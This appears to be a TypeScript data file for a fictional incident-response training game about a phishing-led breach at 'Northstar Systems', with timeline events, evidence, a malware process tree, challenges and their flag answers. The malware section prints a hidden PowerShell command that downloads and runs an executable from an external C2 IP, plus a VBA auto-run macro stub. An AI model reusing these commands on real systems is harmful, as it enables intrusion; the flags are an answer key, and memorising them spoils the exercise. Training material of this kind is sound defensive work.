import {
  TimelineEvent,
  EvidenceItem,
  MalwareAnalysis,
  VirtualFile,
  NetworkNode,
  Endpoint,
  Identity,
  CTFChallenge,
  AttackStage,
  DecisionPrompt
} from '../types/investigation';

export const CASE_METADATA = {
  id: 'INC-2026-0825',
  organization: 'NORTHSTAR SYSTEMS',
  incidentName: 'SUSPICIOUS INTERNAL ACTIVITY',
  status: 'ACTIVE',
  difficulty: 'ADVANCED',
  initialScore: 740,
  briefing: {
    title: 'CYBER INCIDENT COMMAND CENTER',
    caseId: 'CASE INC-2026-0825',
    target: 'NORTHSTAR SYSTEMS',
    reportHeader: 'INITIAL INCIDENT REPORT',
    bodyText: `At 09:42 UTC, the SOC detected abnormal authentication activity originating from an internal workstation.

A privileged account subsequently accessed multiple internal systems.

The security team has initiated an investigation.`,
    objectives: [
      'Identify the initial access vector.',
      'Determine the compromised identity.',
      'Trace the attacker activity.',
      'Identify affected systems.',
      'Recover the exfiltrated information.',
      'Contain the incident.'
    ]
  }
};

export const INITIAL_TIMELINE: TimelineEvent[] = [
  {
    id: 'TL-001',
    timestamp: '09:42:18',
    type: 'EMAIL_DELIVERY',
    category: 'EMAIL',
    source: 'finance-update@mail-sec-relay.net',
    destination: 'employee@northstar.local (FINANCE-02)',
    description: 'PHISHING EMAIL DELIVERED - Subject: "Updated Payroll Document" containing Payroll_Update.xlsm attachment',
    evidenceId: 'EVIDENCE-017',
    severity: 'MEDIUM'
  },
  {
    id: 'TL-002',
    timestamp: '09:44:02',
    type: 'FILE_EXECUTION',
    category: 'FILES',
    source: 'FINANCE-02 (10.42.18.73)',
    destination: 'C:\\Users\\finance01\\Downloads\\Payroll_Update.xlsm',
    description: 'USER CREDENTIALS SUBMITTED - Macro executed EXCEL.EXE spawning cmd.exe & powershell.exe script',
    evidenceId: 'EVIDENCE-018',
    severity: 'HIGH'
  },
  {
    id: 'TL-003',
    timestamp: '09:44:19',
    type: 'AUTHENTICATION',
    category: 'AUTH',
    source: '10.42.18.73',
    destination: 'DC-01 (10.42.10.10)',
    description: 'SUSPICIOUS AUTHENTICATION - Successful authentication using FINANCE01 credentials',
    evidenceId: 'AUTH-019',
    severity: 'HIGH'
  },
  {
    id: 'TL-004',
    timestamp: '09:47:03',
    type: 'AUTH_ANOMALY',
    category: 'IDENTITY',
    source: '185.44.91.20 (EXTERNAL C2)',
    destination: 'DC-01 (10.42.10.10)',
    description: 'PRIVILEGED ACCOUNT ACCESSED - Account finance01 authenticated from unknown external IP address',
    evidenceId: 'AUTH-021',
    severity: 'CRITICAL'
  },
  {
    id: 'TL-005',
    timestamp: '09:51:44',
    type: 'LATERAL_MOVEMENT',
    category: 'ENDPOINT',
    source: '185.44.91.20',
    destination: 'FILE-01 (10.42.10.20)',
    description: 'INTERNAL SERVER ACCESS - SMB session established to \\FILE-01\\Finance\\Shared Archives',
    evidenceId: 'NET-008',
    severity: 'HIGH'
  },
  {
    id: 'TL-006',
    timestamp: '09:57:22',
    type: 'FILE_CREATION',
    category: 'FILES',
    source: 'FINANCE-02',
    destination: 'C:\\AppData\\Local\\Temp\\FINANCE_EXPORT_2026.zip',
    description: 'ARCHIVE CREATED - Staging 482MB encrypted zip file containing financial database tables',
    evidenceId: 'FILE-021',
    severity: 'CRITICAL'
  },
  {
    id: 'TL-007',
    timestamp: '10:01:13',
    type: 'DATA_EXFILTRATION',
    category: 'NETWORK',
    source: '10.42.18.73 (FINANCE-02)',
    destination: '185.44.91.20:443 (OUTBOUND HTTPS)',
    description: 'OUTBOUND TRANSFER DETECTED - Encrypted payload exfiltration completed (482 MB transfer)',
    evidenceId: 'NET-012',
    severity: 'CRITICAL'
  }
];

export const INITIAL_EVIDENCE: EvidenceItem[] = [
  {
    id: 'EVIDENCE-017',
    type: 'EMAIL',
    source: 'finance@northstar.local (Spoofed Relay: 185.44.91.20)',
    recipient: 'employee@northstar.local',
    timestamp: '09:42:18 UTC',
    subject: 'Updated Payroll Document & Q3 Salary Adjustments',
    attachment: 'Payroll_Update.xlsm',
    status: 'SUSPICIOUS',
    headers: {
      'Return-Path': '<bounce-ref-9102@mail-sec-relay.net>',
      'Received': 'from mail-sec-relay.net (185.44.91.20) by mx01.northstar.local with ESMTP',
      'X-Authentication-Results': 'spf=fail (sender IP 185.44.91.20 is not permitted)',
      'DKIM-Signature': 'v=1; a=rsa-sha256; c=relaxed/relaxed; d=mail-sec-relay.net',
      'Content-Type': 'multipart/mixed; boundary="----=_NextPart_000_01D9"'
    },
    body: `Dear Team,

Please review the attached updated payroll document for Q3 adjustments.
You are required to enable macros upon opening to view your individual salary statement.

Regards,
Northstar Systems Finance Department`,
    details: 'Received from unverified external MTA with SPF failure. Attachment contains obfuscated VBA macros.',
    flag: 'FLAG{initial_access_found}'
  },
  {
    id: 'AUTH-019',
    type: 'CREDENTIAL EVENT',
    source: '10.42.18.73 (FINANCE-02)',
    recipient: 'DC-01 (10.42.10.10)',
    timestamp: '09:44:19 UTC',
    subject: 'Kerberos Ticket Granting Request (TGT)',
    status: 'CONFIRMED MALICIOUS',
    details: 'Kerberos TGT requested for identity "finance01". Encryption type: AES256-CTS-HMAC-SHA1-96. Request originated immediately post-macro execution.',
    rawLog: `09:44:19 UTC Kerberos-SSO Event ID 4768 Account: finance01 Client IP: 10.42.18.73 Ticket Options: 0x40810010 Result Code: 0x0`
  },
  {
    id: 'AUTH-021',
    type: 'CREDENTIAL EVENT',
    source: '185.44.91.20',
    recipient: 'DC-01 (10.42.10.10)',
    timestamp: '09:47:03 UTC',
    subject: 'NTLM Remote Authentication Anomaly',
    status: 'CONFIRMED MALICIOUS',
    details: 'User "finance01" logged in from external IP 185.44.91.20 via NTLMv2. User normal workstation is 10.42.18.73.',
    rawLog: `09:47:03 UTC Security Event ID 4624 Logon Type: 3 (Network) User: finance01 Source IP: 185.44.91.20 Auth Package: NTLM`,
    flag: 'FLAG{finance_account_compromised}'
  },
  {
    id: 'FILE-021',
    type: 'FILE',
    source: 'C:\\Users\\finance01\\AppData\\Local\\Temp\\',
    timestamp: '09:57:22 UTC',
    subject: 'Staged Exfiltration Archive',
    attachment: 'FINANCE_EXPORT_2026.zip',
    status: 'CONFIRMED MALICIOUS',
    details: 'Encrypted Zip archive containing DB export scripts and corporate payroll spreadsheets. Created using command line 7z.exe script.',
    flag: 'FLAG{follow_the_archive}'
  },
  {
    id: 'NET-008',
    type: 'NETWORK CAPTURE',
    source: '185.44.91.20',
    recipient: '10.42.10.20 (FILE-01)',
    timestamp: '09:51:44 UTC',
    subject: 'SMB Protocol Session',
    status: 'SUSPICIOUS',
    details: 'Established SMB2 connection to share \\FILE-01\\Finance using hijacked Kerberos ticket.',
    rawLog: `09:51:44.112 TCP 185.44.91.20:49210 -> 10.42.10.20:445 [SYN] Tree Connect: \\FILE-01\\Finance\\`
  },
  {
    id: 'NET-012',
    type: 'NETWORK CAPTURE',
    source: '10.42.18.73',
    recipient: '185.44.91.20:443',
    timestamp: '10:01:13 UTC',
    subject: 'HTTPS C2 Outbound Data Stream',
    status: 'CONFIRMED MALICIOUS',
    details: '482.4 Megabytes transmitted over TLS 1.3 session to IP 185.44.91.20. Target certificate CN: updater.cdn-sec-check.org',
    flag: 'FLAG{exfiltrated_archive_zip}'
  },
  {
    id: 'ENDPOINT-REG-01',
    type: 'ENDPOINT ARTIFACT',
    source: 'FINANCE-02 Registry',
    timestamp: '09:45:10 UTC',
    subject: 'Persistence Registry Auto-Run Key',
    status: 'CONFIRMED MALICIOUS',
    details: 'Key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsSecurityUpdater -> C:\\Users\\finance01\\AppData\\Roaming\\updater.exe',
    flag: 'FLAG{persistence_registry_run}'
  }
];

export const MALWARE_SAMPLE: MalwareAnalysis = {
  fileId: 'MAL-001',
  filename: 'Payroll_Update.xlsm',
  fileType: 'Microsoft Excel Macro-Enabled Worksheet (.xlsm)',
  size: '184 KB',
  hash: 'SHA256: 7b7e9a3189cf042189a7123490bca1123456789abcdef0123456789abcdef012',
  firstSeen: '09:44:03 UTC',
  detectedBehavior: [
    'Creates spawned sub-processes without standard user interaction',
    'Attempts credential access by invoking LSASS dumping commands',
    'Contacts external C2 IP address 185.44.91.20 over port 443',
    'Creates persistence registry entry in HKCU\\...\\Run'
  ],
  processTree: {
    pid: 4812,
    name: 'EXCEL.EXE',
    command: '"C:\\Program Files\\Microsoft Office\\Office16\\EXCEL.EXE" "C:\\Users\\finance01\\Downloads\\Payroll_Update.xlsm"',
    isSuspicious: true,
    explanation: 'Parent process that executed Auto_Open macro upon document launch',
    children: [
      {
        pid: 5120,
        name: 'cmd.exe',
        command: 'cmd.exe /c powershell -ExecutionPolicy Bypass -W Hidden -Enc SQBFAFgA...',
        parentPid: 4812,
        isSuspicious: true,
        explanation: 'Command interpreter spawned by Excel macro to run encoded PowerShell payload',
        children: [
          {
            pid: 5384,
            name: 'powershell.exe',
            command: 'powershell.exe -nop -w hidden -c "Invoke-WebRequest -Uri hxxps://185.44.91.20/updater.exe -OutFile $env:APPDATA\\updater.exe; Start-Process $env:APPDATA\\updater.exe"',
            parentPid: 5120,
            isSuspicious: true,
            explanation: 'Downloads secondary executable binary from external C2 host 185.44.91.20',
            children: [
              {
                pid: 6012,
                name: 'updater.exe',
                command: 'C:\\Users\\finance01\\AppData\\Roaming\\updater.exe --c2=185.44.91.20:443',
                parentPid: 5384,
                isSuspicious: true,
                explanation: 'Active C2 reverse shell agent providing remote command execution to attacker'
              }
            ]
          }
        ]
      }
    ]
  }
};

export const VIRTUAL_FILESYSTEM: VirtualFile[] = [
  {
    path: '/Users/finance01/',
    name: 'finance01',
    type: 'dir',
    timestamp: '2026-08-25 09:30'
  },
  {
    path: '/Users/finance01/Downloads/',
    name: 'Downloads',
    type: 'dir',
    timestamp: '2026-08-25 09:44'
  },
  {
    path: '/Users/finance01/Downloads/Payroll_Update.xlsm',
    name: 'Payroll_Update.xlsm',
    type: 'file',
    size: '184 KB',
    timestamp: '2026-08-25 09:42',
    isClue: true,
    content: '[SUSPICIOUS EXCEL FILE WITH VBA MACRO]\nMacro Code:\nSub Auto_Open()\n    Shell("cmd.exe /c powershell -w hidden -Enc SQBFAFgA...")\nEnd Sub'
  },
  {
    path: '/Users/finance01/Documents/',
    name: 'Documents',
    type: 'dir',
    timestamp: '2026-08-25 08:15'
  },
  {
    path: '/Users/finance01/Documents/Network_Topology_Notes.txt',
    name: 'Network_Topology_Notes.txt',
    type: 'file',
    size: '2 KB',
    timestamp: '2026-08-24 14:10',
    content: `NORTHSTAR SYSTEMS INTERNAL SUB-NETWORKS:
Workstations: 10.42.18.0/24
Primary Domain Controller: DC-01 (10.42.10.10)
Finance Share: FILE-01 (10.42.10.20)
Database Cluster: DB-01 (10.42.10.30)
Backup Server: BACKUP-01 (10.42.10.40)`
  },
  {
    path: '/Users/finance01/AppData/Roaming/',
    name: 'Roaming',
    type: 'dir',
    timestamp: '2026-08-25 09:45'
  },
  {
    path: '/Users/finance01/AppData/Roaming/updater.exe',
    name: 'updater.exe',
    type: 'file',
    size: '1.2 MB',
    timestamp: '2026-08-25 09:45',
    isClue: true,
    content: '[BINARY MALWARE PAYLOAD]\nC2 Beacon Address: 185.44.91.20:443\nProtocol: Custom TLS Reverse Shell\nSHA256: 3a9f1827409bcda...'
  },
  {
    path: '/Users/finance01/AppData/Local/Temp/FINANCE_EXPORT_2026.zip',
    name: 'FINANCE_EXPORT_2026.zip',
    type: 'file',
    size: '482 MB',
    timestamp: '2026-08-25 09:57',
    isEncrypted: true,
    isClue: true,
    flag: 'FLAG{follow_the_archive}',
    content: '[ENCRYPTED ARCHIVE]\nFiles: \n - Payroll_Q3_All_Employees.xlsx\n - Exec_Compensation_2026.csv\n - Banking_Routing_Details.db\nPassword Status: Encrypted with hardcoded AES key'
  },
  {
    path: '/Corporate/Shared/',
    name: 'Shared',
    type: 'dir',
    timestamp: '2026-08-20 11:00'
  },
  {
    path: '/Corporate/Shared/Incident_Response_Playbook.pdf',
    name: 'Incident_Response_Playbook.pdf',
    type: 'file',
    size: '4.5 MB',
    timestamp: '2026-01-15 10:00',
    content: 'Northstar Systems Incident Containment Protocol: Step 1. Isolate compromised workstation from network. Step 2. Disable compromised user credentials.'
  }
];

export const NETWORK_NODES: NetworkNode[] = [
  {
    id: 'NET-EXT',
    label: 'INTERNET C2',
    type: 'internet',
    ip: '185.44.91.20',
    os: 'Linux (Attacker C2)',
    status: 'COMPROMISED',
    lastActivity: '10:01:13 UTC',
    authEvents: 4,
    connections: ['MAIL-GW', 'FINANCE-02'],
    description: 'Rogue external IP sending malicious emails and hosting C2 channel'
  },
  {
    id: 'MAIL-GW',
    label: 'MAIL-GW',
    type: 'gateway',
    ip: '10.42.1.5',
    os: 'Linux Security Gateway',
    status: 'SUSPICIOUS',
    lastActivity: '09:42:18 UTC',
    authEvents: 120,
    connections: ['FINANCE-02'],
    description: 'Inbound email gateway relaying emails to internal workstations'
  },
  {
    id: 'FINANCE-02',
    label: 'FINANCE-02',
    type: 'workstation',
    ip: '10.42.18.73',
    os: 'Windows 11 Enterprise',
    status: 'COMPROMISED',
    lastActivity: '10:01:13 UTC',
    authEvents: 8,
    connections: ['DC-01', 'FILE-01', 'NET-EXT'],
    description: 'Compromised workstation assigned to finance01'
  },
  {
    id: 'DC-01',
    label: 'DC-01',
    type: 'server',
    ip: '10.42.10.10',
    os: 'Windows Server 2022',
    status: 'SUSPICIOUS',
    lastActivity: '09:47:03 UTC',
    authEvents: 1450,
    connections: ['FINANCE-02', 'FILE-01', 'DB-01'],
    description: 'Active Directory Domain Controller authenticating finance01'
  },
  {
    id: 'FILE-01',
    label: 'FILE-01',
    type: 'server',
    ip: '10.42.10.20',
    os: 'Ubuntu Linux 22.04 LTS',
    status: 'SUSPICIOUS',
    lastActivity: '09:51:44 UTC',
    authEvents: 42,
    connections: ['FINANCE-02', 'DC-01'],
    description: 'Corporate SMB File Server hosting finance archives'
  },
  {
    id: 'DB-01',
    label: 'DB-01',
    type: 'database',
    ip: '10.42.10.30',
    os: 'RHEL 9 PostgreSQL Cluster',
    status: 'NORMAL',
    lastActivity: '09:30:00 UTC',
    authEvents: 89,
    connections: ['FILE-01'],
    description: 'Financial Database server - No direct breach detected yet'
  },
  {
    id: 'BACKUP-01',
    label: 'BACKUP-01',
    type: 'server',
    ip: '10.42.10.40',
    os: 'Debian 12 Backup Node',
    status: 'NORMAL',
    lastActivity: '04:00:00 UTC',
    authEvents: 12,
    connections: ['DC-01'],
    description: 'Isolated offline backup system'
  }
];

export const ENDPOINTS: Endpoint[] = [
  {
    id: 'EP-01',
    hostname: 'FINANCE-02',
    ip: '10.42.18.73',
    os: 'Windows 11 Pro 22H2',
    user: 'finance01',
    status: 'COMPROMISED',
    lastSeen: '10:01:13 UTC',
    openPorts: [135, 139, 445, 3389],
    compromiseVector: 'Malicious macro execution in Excel followed by HTTP C2 reverse shell'
  },
  {
    id: 'EP-02',
    hostname: 'DC-01',
    ip: '10.42.10.10',
    os: 'Windows Server 2022 Datacenter',
    user: 'SYSTEM',
    status: 'SUSPICIOUS',
    lastSeen: '09:47:03 UTC',
    openPorts: [53, 88, 135, 389, 445, 636, 3268],
    compromiseVector: 'Unauthorized NTLM authentication from external IP 185.44.91.20'
  },
  {
    id: 'EP-03',
    hostname: 'FILE-01',
    ip: '10.42.10.20',
    os: 'Ubuntu 22.04 LTS',
    user: 'sysadmin',
    status: 'SUSPICIOUS',
    lastSeen: '09:51:44 UTC',
    openPorts: [22, 139, 445],
    compromiseVector: 'Compromised SMB connection established by finance01 account'
  },
  {
    id: 'EP-04',
    hostname: 'DB-01',
    ip: '10.42.10.30',
    os: 'RHEL 9.2 Enterprise',
    user: 'postgres',
    status: 'NORMAL',
    lastSeen: '09:30:00 UTC',
    openPorts: [22, 5432]
  },
  {
    id: 'EP-05',
    hostname: 'MAIL-GW',
    ip: '10.42.1.5',
    os: 'Alpine Linux 3.18',
    user: 'postfix',
    status: 'NORMAL',
    lastSeen: '09:42:18 UTC',
    openPorts: [25, 587]
  }
];

export const IDENTITIES: Identity[] = [
  {
    username: 'finance01',
    role: 'Senior Financial Analyst',
    lastLogin: '09:47:03 UTC',
    normalIp: '10.42.18.73',
    suspiciousIp: '185.44.91.20',
    failedLogins: 1,
    privilegeLevel: 'FINANCE_ADMIN',
    systemsAccessed: ['FINANCE-02', 'DC-01', 'FILE-01'],
    isCompromised: true,
    recentActivity: 'Phishing attachment opened -> Credentials harvested -> Remote login from 185.44.91.20'
  },
  {
    username: 'administrator',
    role: 'Global Domain Administrator',
    lastLogin: '08:15:00 UTC',
    normalIp: '10.42.10.5',
    failedLogins: 0,
    privilegeLevel: 'SYSTEM_ADMIN',
    systemsAccessed: ['DC-01', 'FILE-01', 'DB-01'],
    isCompromised: false,
    recentActivity: 'Routine morning Active Directory backup & sync'
  },
  {
    username: 'helpdesk01',
    role: 'Tier 1 Support Specialist',
    lastLogin: '09:10:22 UTC',
    normalIp: '10.42.18.12',
    failedLogins: 0,
    privilegeLevel: 'HELPDESK',
    systemsAccessed: ['FINANCE-02'],
    isCompromised: false,
    recentActivity: 'Assisted user finance01 with password reset last week'
  },
  {
    username: 'developer02',
    role: 'Backend Systems Engineer',
    lastLogin: '07:45:11 UTC',
    normalIp: '10.42.18.104',
    failedLogins: 0,
    privilegeLevel: 'USER',
    systemsAccessed: ['DB-01'],
    isCompromised: false,
    recentActivity: 'Pushed git commits to internal code repository'
  }
];

export const CTF_CHALLENGES: CTFChallenge[] = [
  {
    id: 'CH-01',
    number: '01',
    title: 'Find the Attacker IP',
    category: 'Network Forensics',
    difficulty: 'EASY',
    description: 'Determine the external IP address used by the threat actor to deliver the phishing relay and perform remote authentication.',
    objective: 'Submit the full IPv4 address of the external attacker C2 node.',
    availableEvidence: ['EVIDENCE-017', 'AUTH-021', 'NET-012'],
    flag: '185.44.91.20',
    solved: false,
    hints: [
      'Look for unverified external IP addresses in email headers or anomaly auth logs.',
      'Check the source IP in event AUTH-021 originating outside the internal 10.42.0.0/16 subnet.',
      'Target IPv4 address is 185.44.91.20.'
    ],
    hintsUsedCount: 0,
    points: 150
  },
  {
    id: 'CH-02',
    number: '02',
    title: 'Identify Compromised Identity',
    category: 'Identity & Access',
    difficulty: 'EASY',
    description: 'Find the username of the internal corporate account whose credentials were compromised during the phishing attack.',
    objective: 'Submit the exact username of the affected account.',
    availableEvidence: ['EVIDENCE-017', 'AUTH-019', 'AUTH-021'],
    flag: 'finance01',
    solved: false,
    hints: [
      'Check the recipient of the suspicious email and Kerberos TGT requests.',
      'Look at the identity associated with workstation FINANCE-02.',
      'Username is finance01.'
    ],
    hintsUsedCount: 0,
    points: 150
  },
  {
    id: 'CH-03',
    number: '03',
    title: 'Find Malicious Attachment',
    category: 'Malware Forensics',
    difficulty: 'MEDIUM',
    description: 'Identify the exact filename of the malicious macro-enabled attachment delivered via email.',
    objective: 'Submit the exact filename of the attachment including file extension.',
    availableEvidence: ['EVIDENCE-017', 'FILE-021', 'MAL-001'],
    flag: 'Payroll_Update.xlsm',
    solved: false,
    hints: [
      'Inspect the email attachment field in EVIDENCE-017.',
      'The file is an Excel macro-enabled spreadsheet.',
      'Filename is Payroll_Update.xlsm.'
    ],
    hintsUsedCount: 0,
    points: 150
  },
  {
    id: 'CH-04',
    number: '04',
    title: 'Recover Hidden Flag',
    category: 'Digital Forensics',
    difficulty: 'MEDIUM',
    description: 'Locate the hidden flag embedded within the exfiltrated staging archive in the filesystem.',
    objective: 'Find and submit the flag string starting with FLAG{...}.',
    availableEvidence: ['FILE-021', '/Users/finance01/AppData/Local/Temp/FINANCE_EXPORT_2026.zip'],
    flag: 'FLAG{follow_the_archive}',
    solved: false,
    hints: [
      'Explore the Filesystem section under /Users/finance01/AppData/Local/Temp/.',
      'Inspect the properties and details of the staged zip file.',
      'The flag format is FLAG{follow_the_archive}.'
    ],
    hintsUsedCount: 0,
    points: 150
  },
  {
    id: 'CH-05',
    number: '05',
    title: 'Identify Persistence Mechanism',
    category: 'Endpoint Security',
    difficulty: 'MEDIUM',
    description: 'Determine the persistence registry entry created by the malware payload to ensure execution across reboots.',
    objective: 'Submit the registry key or flag found in the endpoint registry artifact.',
    availableEvidence: ['ENDPOINT-REG-01', 'MAL-001'],
    flag: 'FLAG{persistence_registry_run}',
    solved: false,
    hints: [
      'Check the Endpoint Artifacts evidence category.',
      'Look for HKCU Run key modifications pointing to updater.exe.',
      'Flag is FLAG{persistence_registry_run}.'
    ],
    hintsUsedCount: 0,
    points: 150
  },
  {
    id: 'CH-06',
    number: '06',
    title: 'Determine Initial Workstation',
    category: 'Incident Response',
    difficulty: 'EASY',
    description: 'Identify the hostname of the first internal workstation targeted and compromised by the attacker.',
    objective: 'Submit the hostname of the compromised initial workstation.',
    availableEvidence: ['TL-002', 'NET-NODES', 'ENDPOINTS'],
    flag: 'FINANCE-02',
    solved: false,
    hints: [
      'Look at the endpoint assigned to IP 10.42.18.73.',
      'It belongs to the finance analyst.',
      'Hostname is FINANCE-02.'
    ],
    hintsUsedCount: 0,
    points: 150
  },
  {
    id: 'CH-07',
    number: '07',
    title: 'Identify Exfiltrated Archive',
    category: 'Data Loss Prevention',
    difficulty: 'HARD',
    description: 'Find the exact name of the encrypted archive file exfiltrated by the threat actor over HTTPS.',
    objective: 'Submit the filename of the staging archive.',
    availableEvidence: ['FILE-021', 'NET-012'],
    flag: 'FINANCE_EXPORT_2026.zip',
    solved: false,
    hints: [
      'Inspect the file creation event at 09:57:22 UTC.',
      'Check the 482MB zip file created in Temp directory.',
      'Filename is FINANCE_EXPORT_2026.zip.'
    ],
    hintsUsedCount: 0,
    points: 150
  },
  {
    id: 'CH-08',
    number: '08',
    title: 'Reconstruct Attack Chain',
    category: 'Threat Intelligence',
    difficulty: 'HARD',
    description: 'Complete the investigation and unlock all 8 sequential stages of the attack chain.',
    objective: 'Submit the master flag after unlocking all attack stages.',
    availableEvidence: ['ATTACK-CHAIN-TAB'],
    flag: 'FLAG{attack_chain_mastered}',
    solved: false,
    hints: [
      'Review all evidence items across Timeline, Malware, and Network tabs.',
      'Ensure all stages from Initial Access to Exfiltration are revealed.',
      'Master Flag is FLAG{attack_chain_mastered}.'
    ],
    hintsUsedCount: 0,
    points: 200
  }
];

export const ATTACK_CHAIN_STAGES: AttackStage[] = [
  {
    id: 'STG-01',
    stageName: 'INITIAL ACCESS',
    unlocked: true,
    evidenceRef: 'EVIDENCE-017',
    timestamp: '09:42:18 UTC',
    description: 'Inbound spear-phishing email delivered from external spoofed MTA mail-sec-relay.net targeting finance staff.'
  },
  {
    id: 'STG-02',
    stageName: 'PHISHING',
    unlocked: true,
    evidenceRef: 'MAL-001',
    timestamp: '09:44:02 UTC',
    description: 'Target opened Payroll_Update.xlsm and enabled VBA macros executing initial stage downloader.'
  },
  {
    id: 'STG-03',
    stageName: 'CREDENTIAL THEFT',
    unlocked: false,
    evidenceRef: 'AUTH-019',
    timestamp: '09:44:19 UTC',
    description: 'Memory scraper extracted NTLM hashes / Kerberos TGT from LSASS process on FINANCE-02.'
  },
  {
    id: 'STG-04',
    stageName: 'ACCOUNT COMPROMISE',
    unlocked: false,
    evidenceRef: 'AUTH-021',
    timestamp: '09:47:03 UTC',
    description: 'Attacker used stolen finance01 credentials from C2 IP 185.44.91.20 to authenticate to Domain Controller.'
  },
  {
    id: 'STG-05',
    stageName: 'LATERAL MOVEMENT',
    unlocked: false,
    evidenceRef: 'NET-008',
    timestamp: '09:51:44 UTC',
    description: 'Established SMB sessions to FILE-01 server accessing confidential corporate archives.'
  },
  {
    id: 'STG-06',
    stageName: 'PRIVILEGE ESCALATION',
    unlocked: false,
    evidenceRef: 'ENDPOINT-REG-01',
    timestamp: '09:45:10 UTC',
    description: 'Configured persistence auto-run registry key HKCU Run key for C2 binary updater.exe.'
  },
  {
    id: 'STG-07',
    stageName: 'DATA COLLECTION',
    unlocked: false,
    evidenceRef: 'FILE-021',
    timestamp: '09:57:22 UTC',
    description: 'Aggregated 482MB of sensitive financial records into encrypted archive FINANCE_EXPORT_2026.zip.'
  },
  {
    id: 'STG-08',
    stageName: 'EXFILTRATION',
    unlocked: false,
    evidenceRef: 'NET-012',
    timestamp: '10:01:13 UTC',
    description: 'Transmitted encrypted payload out of corporate network over TLS port 443 to 185.44.91.20.'
  }
];

export const DECISION_PROMPTS: DecisionPrompt[] = [
  {
    id: 'DEC-01',
    triggerEventId: 'TL-005',
    title: 'CRITICAL CONTAINMENT EVENT',
    description: 'The attacker is actively connected to FILE-01 via compromised credentials from host 10.42.18.73 / IP 185.44.91.20. Select the immediate incident response action:',
    options: [
      {
        id: 'OPT-ISOLATE',
        label: 'ISOLATE HOST & DISABLE ACCOUNT',
        actionName: 'Immediate Network Isolation',
        isCorrect: true,
        scoreDelta: 100,
        feedback: 'EXCELLENT DECISION: Host FINANCE-02 was isolated and account finance01 was disabled. Attacker SMB sessions severed.'
      },
      {
        id: 'OPT-BLOCK-IP',
        label: 'BLOCK IP ONLY',
        actionName: 'Perimeter IP Block',
        isCorrect: false,
        scoreDelta: -25,
        feedback: 'SUBOPTIMAL: IP 185.44.91.20 was blocked at firewall, but active internal C2 persistence on FINANCE-02 re-established secondary egress channel.'
      },
      {
        id: 'OPT-MONITOR',
        label: 'CONTINUE MONITORING',
        actionName: 'Passive Monitoring',
        isCorrect: false,
        scoreDelta: -50,
        feedback: 'CRITICAL FAILURE: Delay allowed the attacker to finish exfiltrating FINANCE_EXPORT_2026.zip before containment.'
      }
    ]
  }
];
